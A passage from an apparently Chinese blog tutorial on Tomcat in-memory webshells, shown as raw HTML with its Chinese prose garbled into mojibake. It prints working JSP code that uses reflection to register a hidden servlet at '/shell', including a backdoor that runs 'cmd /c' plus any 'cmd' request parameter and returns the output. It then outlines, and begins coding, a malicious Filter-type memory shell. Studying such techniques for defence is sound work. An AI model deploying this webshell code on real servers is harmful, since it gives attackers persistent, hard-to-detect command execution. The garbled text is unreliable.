class="hljs-comment">//è·å–ApplicationContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//è·å–StandardContext</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><p>ç„¶ååé¢çš„å°±æ¯”è¾ƒç®€å•äº†ï¼ŒæŒ‰ç…§æˆ‘ä»¬å‰é¢åˆ†æçš„æ³¨å†Œæ­¥éª¤å³å¯ï¼Œå°±æ˜¯è¦æ³¨æ„ä¸€ç‚¹æˆ‘ä»¬è¦æ‰‹åŠ¨å°†servletå®ä¾‹æ³¨å†Œè¿›å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2.è·å–wrapperç„¶åæ·»åŠ </span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>wrapper.setServletClass(TestShell.class.getName());<br>   <span class="hljs-comment">//åº”å¯¹æ‡’åŠ è½½æ·»åŠ æˆ‘ä»¬çš„å®ä¾‹åŒ–servlet</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br><span class="hljs-comment">//3.å°†wrapperæ·»åŠ è¿›standardContext</span><br>standardContext.addChild(wrapper);<br><span class="hljs-comment">//4.æ·»åŠ æ˜ å°„</span><br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™ä¸ªservletæˆ‘ä»¬å°±ç®€å•çš„å¼¹ä¸€ä¸ªè®¡ç®—å™¨ï¼Œå®Œæ•´çš„jspæ–‡ä»¶å¦‚ä¸‹</p><p>addServlet.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br><span class="hljs-comment">//åŠ¨æ€æ³¨å†Œ</span><br>    <span class="hljs-comment">//1.è·å–standardContext</span><br>        <span class="hljs-comment">//è·å–ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//è·å–StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//2.è·å–wrapperç„¶åæ·»åŠ </span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>    wrapper.setServletClass(TestShell.class.getName());<br>        <span class="hljs-comment">//åº”å¯¹æ‡’åŠ è½½æ·»åŠ æˆ‘ä»¬çš„å®ä¾‹åŒ–servlet</span><br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br>    <span class="hljs-comment">//3.å°†wrapperæ·»åŠ è¿›standardContext</span><br>    standardContext.addChild(wrapper);<br>    <span class="hljs-comment">//4.æ·»åŠ æ˜ å°„</span><br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409161818833.png" alt="image-20240916181846766"></p><p><img src="https://cdn.clown2024.cn/202409161819095.png" alt="image-20240916181903999"></p><p>ç„¶åæˆåŠŸç™½å±å¼¹è®¡ç®—å™¨ğŸ˜‹</p><p>è€Œæˆ‘ä»¬å‰é¢çš„demoæˆ‘æ˜¯ç›´æ¥ç”¨çš„æ–‡ç« é‡Œçš„ï¼Œä»–è¿™é‡Œå°±æ˜¯ç”¨äº†ä¸€ä¸ªéšæœºè·¯å¾„å’Œéšæœºæ–‡ä»¶åçš„æ–¹å¼æ³¨å†Œï¼Œç„¶åç›´æ¥ç”¨åŒ¿åç±»çš„å½¢å¼è¿›è¡Œå®ç°åŒ–ï¼Œç„¶åç›´æ¥å°†å‘½ä»¤ç»“æœæ‰“å°å‡ºæ¥åˆ°ç½‘é¡µ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä»–è¿™é‡Œä½¿ç”¨<code>cmd /c</code>æ¥å®ç°å¯ä»¥æ‰§è¡Œå¸¦æœ‰ç©ºæ ¼çš„å‘½ä»¤ï¼Œä¾‹å¦‚<code>echo ä¸–ç•Œï¼Œä½ å¥½ï¼</code>ï¼›å¯¹äºLinuxç³»ç»Ÿï¼Œé‚£å°±æ˜¯<code>/bin/sh -c</code></p><blockquote><p>è‡³äºLoadOnStartUpè¿™ä¸ªç©æ„æ²¡å‘ç°ä»–çš„ä½œç”¨æš‚æ—¶</p></blockquote><p><strong>å…³äºå®ä¾‹åŒ–servletçš„æ·»åŠ </strong></p><p>å› ä¸ºæ‡’åŠ è½½æœºåˆ¶æˆ‘ä»¬æ˜¯åœ¨è®¿é—®åæ‰è¿›è¡Œçš„å®ä¾‹åŒ–servletï¼Œç„¶åæˆ‘å°±æƒ³æ¢ç©¶ä¸€ä¸‹è¿™ä¸ªservletåˆ°åº•æ˜¯åœ¨å“ªé‡Œè¢«å®ä¾‹åŒ–ç„¶åæ·»åŠ åˆ°wrapperé‡Œé¢ï¼Œä½†æˆ‘è°ƒäº†å¾ˆä¹…ä¹Ÿæ²¡æœ‰å‘ç°æ”¾è¿›wrapperçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409192045616.png" alt="image-20240919204457080"></p><p>æˆ‘è¿™é‡Œæ‰¾åˆ°çš„è°ƒç”¨StandardWrapper#allocate()æ¥å®ä¾‹åŒ–ä¸€ä¸ªservletï¼Œç„¶åå¾€ä¸‹æœ‰ä¸ªcreateFilterChainå‡½æ•°ï¼Œä»–å°†servletä¼ é€’äº†è¿›å»ï¼Œæˆ‘å°±å»çœ‹äº†ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409192050093.png" alt="image-20240919205001955"></p><p>ç„¶ååªæœ‰è¿™é‡Œæ˜¯å°†å®ä¾‹æ·»åŠ è¿›äº†filterchainï¼Œæ­¤æ—¶æˆ‘è¿˜æ˜¯æ²¡çœ‹åˆ°å¦‚expé‡Œé¢çš„è¦å°†servletæ”¾è¿›wrapperé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409192054750.png" alt="image-20240919205426641"></p><p>æœ€åæ‰§è¡Œåˆ°servletçš„æ—¶å€™å°±æ˜¯åœ¨doFilteræ–¹æ³•é‡Œé¢è°ƒç”¨servletå±æ€§çš„serviceæ–¹æ³•ï¼Œç„¶ååˆ°servletçš„doGetæ–¹æ³•é‡Œäº†</p><p>åæ¥ç»ˆäºæƒ³é€šäº†ï¼Œçœ‹ä»£ç å¤ªä¸ç»†è‡´è¿˜æ˜¯æ¼äº†å…³é”®çš„åœ°æ–¹ï¼Œæˆ‘åœ¨è®¿é—®å†…å­˜é©¬é¡µé¢ä¹‹åå†è°ƒè¯•å›åˆ°é‚£ä¸ªallocateæ–¹æ³•é‡Œé¢ï¼Œå‘ç°æˆ‘ä»¬è®¾ç½®äº†å®ä¾‹ä¹‹åä»–çš„åˆ¤æ–­é€»è¾‘å°±ä¸åŒäº†</p><p><img src="https://cdn.clown2024.cn/202409192108171.png" alt="image-20240919210819062"></p><p>å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†instanceï¼Œè¿™éƒ¨åˆ†çš„é€»è¾‘å°±è¢«è·³è¿‡äº†ï¼Œç„¶åå°±ä¼šåˆ°ä¸‹é¢è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202409192109478.png" alt="image-20240919210910379"></p><p>ç›´æ¥è¿”å›æˆ‘ä»¬è®¾ç½®çš„instanceï¼Œç„¶åå†æ”¾è¿›äº†filterchainé‡Œé¢ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ç”¨wrapper.setServletæ–¹æ³•çš„åŸå› </p><p>æ‰€ä»¥å…¶å®æˆ‘åœ¨æƒ³å¦‚æœèƒ½å¤Ÿè·å–filterChainçš„è¯ç›´æ¥æ·»åŠ æ•ˆæœåº”è¯¥ä¹Ÿæ˜¯ä¸€æ ·çš„</p><h1 id="filterå†…å­˜é©¬"><a href="#Filterå†…å­˜é©¬" class="headerlink" title="Filterå†…å­˜é©¬"></a>Filterå†…å­˜é©¬</h1><p>è¿™éƒ¨åˆ†å‚è€ƒæ–‡ç« ï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/%EF%BC%8Chttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/ï¼Œhttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p>å†™Filterå†…å­˜é©¬çš„æ­¥éª¤ï¼š</p><ul><li>è·å–StandardContextï¼›</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„filterï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterDefç±»ï¼ŒåŒ…è£…filterå¹¶å­˜æ”¾åˆ°<code>StandardContext.filterDefs</code>ä¸­ï¼›</li><li>å®ä¾‹åŒ–ä¸€ä¸ªFilterMapç±»ï¼Œå°†æˆ‘ä»¬çš„Filterå’Œurlpatternç›¸å¯¹åº”ï¼Œä½¿ç”¨addFilterMapBeforeå­˜æ”¾åˆ°StandardContext.filterMapsä¸­ï¼›</li><li>é€šè¿‡åå°„è·å–filterConfigsï¼Œå®ä¾‹åŒ–ä¸€ä¸ª<code>FilterConfig</code>ï¼ˆ<code>ApplicationFilterConfig</code>ï¼‰ç±»ï¼Œä¼ å…¥<code>StandardContext</code>ä¸<code>filterDefs</code>ï¼Œå­˜æ”¾åˆ°filterConfigä¸­ã€‚</li></ul><p>æœ‰å…³filterç›¸å…³çš„å†…å®¹å¯ä»¥çœ‹ä¸€ä¸‹é‡Œé¢æ–‡ç« çš„æ€»ç»“ã€‚</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-1" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>è¿™é‡Œå¼€å§‹å…ˆåˆ†æå†å†™</p><p>filteræˆ‘ä»¬çŸ¥é“å°±æ˜¯servletå‰çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å®ç°ä¸€ä¸ªfilterå¹¶å†™æ¶æ„ä»£ç ï¼Œç„¶åæ·»åŠ è¿›å»å³å¯</p><p><strong>äº†è§£ä¸€ä¸‹æœ‰å…³filterçš„å„ä¸ªåè¯</strong></p><ul><li>FilterDefsï¼šé¦–å…ˆï¼Œéœ€è¦å®šä¹‰è¿‡æ»¤å™¨FilterDefï¼Œå­˜æ”¾è¿™äº›FilterDefçš„æ•°ç»„è¢«ç§°ä¸ºFilterDefsï¼Œæ¯ä¸ªFilterDefå®šä¹‰äº†ä¸€ä¸ªå…·ä½“çš„è¿‡æ»¤å™¨ï¼ŒåŒ…æ‹¬æè¿°ä¿¡æ¯ã€åç§°ã€è¿‡æ»¤å™¨å®ä¾‹ä»¥åŠclassç­‰ã€‚</li><li>FilterConfigsï¼šæ˜¯è¿™äº›è¿‡æ»¤å™¨çš„å…·ä½“é…ç½®å®ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸ªè¿‡æ»¤å™¨å®šä¹‰å…·ä½“çš„é…ç½®å‚æ•°ï¼Œä»¥æ»¡è¶³ç³»ç»Ÿçš„éœ€æ±‚ã€‚</li><li>FilterMapsï¼šç”¨äºå°†FilterConfigsæ˜ å°„åˆ°å…·ä½“çš„è¯·æ±‚è·¯å¾„æˆ–å…¶ä»–æ ‡è¯†ä¸Šï¼Œè¿™æ ·ç³»ç»Ÿåœ¨å¤„ç†è¯·æ±‚æ—¶å°±èƒ½å¤Ÿæ ¹æ®è¯·æ±‚çš„è·¯å¾„æˆ–æ ‡è¯†æ‰¾åˆ°å¯¹åº”çš„FilterConfigsã€‚</li><li>FilterChainï¼šæ˜¯ç”±å¤šä¸ªFilterConfigsç»„æˆçš„é“¾å¼ç»“æ„ï¼Œå®ƒå®šä¹‰äº†è¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºï¼Œåœ¨å¤„ç†è¯·æ±‚æ—¶ç³»ç»Ÿä¼šæŒ‰ç…§FilterChainä¸­çš„é¡ºåºä¾æ¬¡æ‰§è¡Œæ¯ä¸ªè¿‡æ»¤å™¨ï¼Œå¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤å’Œå¤„ç†ã€‚</li></ul><p><strong>è®¿é—®ç½‘é¡µå‰çš„filteræ·»åŠ </strong></p><p>åŒæ ·çš„filterçš„æ·»åŠ ä¹Ÿåœ¨æˆ‘ä»¬ä¹‹å‰è¯´åˆ°çš„ContextConfig#configureContexté‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409161922576.png" alt="image-20240916192256483"></p><p>è¿™é‡Œå¾€contexté‡Œé¢æ·»åŠ filterdefï¼Œå…·ä½“ä»£ç å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409161924392.png" alt="image-20240916192439333"></p><p>æ·»åŠ åˆ°ä¸€ä¸ªhashMapé‡Œé¢ï¼Œä¸‹é¢æ˜¯filterDefçš„ç›¸å…³å±æ€§</p><p><img src="https://cdn.clown2024.cn/202409192131516.png" alt="image-20240919213120425"></p><p>æœ‰äº›å±æ€§æ˜¯æˆ‘ä»¬åˆ°æ—¶å€™åˆ›å»ºçš„æ—¶å€™éœ€è¦è®¾ç½®çš„</p><p><img src="https://cdn.clown2024.cn/202409161925478.png" alt="image-20240916192510416"></p><p>è¿™é‡Œæ˜¯æ·»åŠ filterMapè¿›å»ï¼Œå†çœ‹ä¸€ä¸‹filterMapé‡Œç›¸å…³çš„å±æ€§</p><p><img src="https://cdn.clown2024.cn/202409192133213.png" alt="image-20240919213313122"></p><p>è¿™å°±æ˜¯è®¿é—®è·¯ç”±å‰çš„æ³¨å†Œå†…å®¹</p><p><strong>è®¿é—®ä¹‹å</strong></p><p>ç°åœ¨æˆ‘ä»¬å†™ä¸€ä¸ªfilterç±»ï¼Œç„¶åæ–­åœ¨doFilteræ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹æ‰§è¡Œçš„è¿‡ç¨‹</p><blockquote><p>è¿™é‡Œçš„chain.doFilteræ˜¯ä¸€å®šè¦å†™çš„ä¸ç„¶å°±èµ°ä¸åˆ°servleté‚£é‡Œäº†ï¼Œå› ä¸ºéå†doFilterä¹‹åï¼Œæœ€ç»ˆæ˜¯åœ¨servletService()æ–¹æ³•ä¸­èµ°åˆ°request</p></blockquote><p><img src="https://cdn.clown2024.cn/202409192135120.png" alt="image-20240919213506978"></p><p>è§‚å¯Ÿä¸€ä¸‹ä»–çš„è°ƒç”¨æ ˆï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»StandardWrapperValve#invokeè¿‡æ¥çš„ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409170050633.png" alt="image-20240917005012554"></p><p>æ‰€ä»¥å¯ä»¥çŸ¥é“æ˜¯åœ¨filterChainçš„doFilteræ–¹æ³•é‡Œé¢æ‰§è¡Œæˆ‘ä»¬çš„filterå’Œservlet</p><p>ç„¶ååœ¨æ‰¾ä¸€ä¸‹filterChainæ˜¯åœ¨å“ªåˆ›å»ºçš„</p><p><img src="https://cdn.clown2024.cn/202409170052061.png" alt="image-20240917005252976"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯åœ¨è¿™é‡Œï¼Œæ¥ä¸‹æ¥é‡æ–°ä¸‹æ–­ç‚¹åˆ°è¿™ï¼Œçœ‹ä¸€ä¸‹filterChainçš„åˆ›å»º</p><p><img src="https://cdn.clown2024.cn/202409192140374.png" alt="image-20240919214048265"></p><p>è¿™é‡Œå…ˆåˆ›å»ºäº†ä¸€ä¸ªApplicationFilterChainç„¶åçœ‹èƒ½å¦ä»reqä¸­è·å–filterChainï¼Œä¸èƒ½å°±æ–°å»ºä¸€ä¸ªApplicationFilterChainåŒæ—¶setç»™reqï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409170101254.png" alt="image-20240917010128142"></p><p>ç„¶åå°±æ˜¯è·å–standardContextå†ä»ä¸­è·å–filterMapsï¼Œç„¶åçœ‹ä¸€ä¸‹ç°åœ¨filterMapsé‡Œé¢çš„å†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409192144379.png" alt="image-20240919214407244"></p><p>å¯ä»¥çœ‹åˆ°æœ‰æœ‰æˆ‘ä»¬è‡ªå·±çš„é‚£ä¸ªFilterMap</p><p><img src="https://cdn.clown2024.cn/202409170106138.png" alt="image-20240917010647039"></p><p>æ¥ä¸‹æ¥ä¼šéå†filterMaps ä¸­çš„ filterMapçš„filterNameï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ filterMap ä¸­çš„ urlPattern åŒ¹é…ä¸”é€šè¿‡filterNameèƒ½æ‰¾åˆ°å¯¹åº”çš„filterConfigï¼Œåˆ™ä¼šå°†å…¶åŠ å…¥filterChain</p><p>é‚£æ¥çœ‹ä¸€ä¸‹ApplicationFilterConfigçš„åˆ›å»º</p><p><img src="https://cdn.clown2024.cn/202409192148887.png" alt="image-20240919214844764"></p><p>å¯ä»¥çœ‹åˆ°ä»StandardContextçš„filterConfigsé‡Œé¢ç›´æ¥æ ¹æ®keyè·å–ApplicationFilterConfigçš„å®ä¾‹</p><p>æœ€åçœ‹ä¸€ä¸‹filterConfigçš„å†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409192151525.png" alt="image-20240919215145392"></p><p>åŒ…å«äº†filterå®ä¾‹å’ŒfilterDefè¿˜æœ‰contextè¿™å‡ ä¸ªé‡è¦å…ƒç´ ï¼Œåˆ°æ­¤filterChainåˆ›å»ºå®Œæˆï¼Œç„¶åå°±æ˜¯æ‰§è¡Œå‰é¢è¯´çš„çš„doFilteræ–¹æ³•</p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>å‰é¢åˆ†æå¯çŸ¥ï¼Œæœ€é‡è¦çš„ä¸¤ä¸ªæ–¹æ³•æ˜¯**StandardContext.findFilterMaps()<strong>å’Œ</strong>StandardContext.findFilterConfig()**ï¼Œæˆ‘ä»¬åªè¦å¾€è¿™2ä¸ªå±æ€§é‡Œé¢æ’å…¥å¯¹åº”çš„filterMapå’ŒfilterConfigå³å¯å®ç°åŠ¨æ€æ·»åŠ filterçš„ç›®çš„ï¼Œè¿™äº›å±æ€§éƒ½åœ¨standardContexté‡Œé¢ï¼Œé‚£ä¹ˆstandardContexté‡Œé¢æ˜¯å¦ä¹Ÿæœ‰æ·»åŠ è¿™äº›å±æ€§çš„æ–¹æ³•å‘¢</p><p>è¿™é‡ŒstandardContextæä¾›äº†æ·»åŠ filterMapçš„æ–¹æ³•<strong>addFilterMapBefore</strong></p><p><img src="https://cdn.clown2024.cn/202409170136347.png" alt="image-20240917013619268"></p><p>è¿™é‡Œä¼šå…ˆæ ¡éªŒï¼Œç„¶åå†æ·»åŠ filterMapï¼Œè·Ÿè¿›ä¸€ä¸‹validateFilterMapæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409170138616.png" alt="image-20240917013804538"></p><p>å¯ä»¥çœ‹åˆ°å®ƒä¼šæ ¹æ®filterNameå»å¯»æ‰¾å¯¹åº”çš„filterDefï¼Œå¦‚æœæ²¡æ‰¾åˆ°çš„è¯ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¿˜éœ€è¦å¾€filterDefsé‡Œæ·»åŠ filterDefã€‚</p><p>å…³äºfilterDefsï¼ŒStandardContextä¹Ÿç›´æ¥æä¾›äº†å¯¹åº”çš„æ·»åŠ æ–¹æ³•addFilterDef</p><p><img src="https://cdn.clown2024.cn/202409170140748.png" alt="image-20240917014031687"></p><p>æœ€åfilterConfigå¹¶æ²¡æœ‰æ·»åŠ è¯¥å±æ€§çš„æ–¹æ³•ï¼Œéœ€è¦æˆ‘ä»¬é€šè¿‡åå°„è·å–å±æ€§è¿›è¡Œä¿®æ”¹</p><p><img src="https://cdn.clown2024.cn/202409170142816.png" alt="image-20240917014218759"></p><p>ç°åœ¨å¤§éƒ¨åˆ†çš„é—®é¢˜æˆ‘ä»¬éƒ½è§£å†³äº†</p><p>ä¸‹é¢æ˜¯å…·ä½“çš„ä»£ç å®ç°</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br><br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// è·å–StandardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> 